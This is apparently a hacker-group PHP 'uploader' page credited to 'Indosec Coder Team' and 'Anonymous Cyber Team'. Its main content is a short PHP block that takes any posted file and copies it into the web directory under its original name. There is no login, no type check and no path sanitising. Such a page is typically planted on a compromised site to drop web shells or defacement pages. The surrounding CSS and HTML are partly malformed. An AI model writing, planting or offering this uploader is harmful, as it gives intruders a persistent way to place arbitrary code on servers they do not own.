<!DOCTYPE htmL>
 <html lang="en">
 <title>Uplouder Mr.Froggy </title>
 <head>
  <style type="text/css">
  	html,body {
  		background: url(https://i.pinimg.com/originals/0c/3d/10/0c3d10ad4d3ec07025f5d05c73780286.jpg);
  		    -webkit-background-size: 50% 50%;
  		    -o-background-size: 25% 25%;
  		    background-size: 25% 25%;

  	}
  	.wrap{
  		background: rgb(226, 0, 224);
  		column-width: 50%;
  		margin-top: 50%;
  		margin-bottom: 50%;
  		margin: 10px auto:;
  		}$breadcrumb-divide: quate(">") 
  				/*header*/
  				.wrap .header{
  					background: red;
  					/*height 25px;*/
  					padding: 5px 5px 5px;
  				}
/*end header*/
.wrap .menu ul li{
	padding: 0;
	margin: 0;
	margin-top: 10;
	background: red;
	overflow: hidden;

  	}
}
h1 {
    display: block;
    font-size: 2em;
    margin-block-start: 0.67em;
    margin-block-end: 0.67em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    font-weight: bold;
}

</style>
</head>
<body>
	<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
	<center>
	
  <h1 style="color:red;">uploud file</h1>
  <?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>
 </center>
 
    <h2><p><font color="red" size="4pt">uplouder ini dibuat dengan otak dek kalo mau rubah ubah mikir ya dek:</font><marquee width="70%" style="color:red;"><font size="3pt">Indosec Coder Team | |Anonymous Cyber Team / By Froggy</font></marquee></p></h2>
  </div>
</body>
</html>
